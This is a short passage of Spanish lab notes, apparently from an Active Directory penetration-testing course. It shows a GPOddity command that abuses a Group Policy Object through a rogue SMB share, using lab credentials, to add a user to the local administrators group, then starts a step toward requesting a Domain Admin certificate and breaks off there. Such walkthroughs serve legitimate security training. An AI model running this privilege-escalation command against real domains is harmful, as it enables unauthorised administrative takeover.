...
```shell
[WSL]
# Usar la máquina que creaste anteriormente
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'std97-gpattack$' --password 'Secretpass@123' --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
```
...
Solicitaremos un certificado para Administrador de Dominio - Administrador
```shell
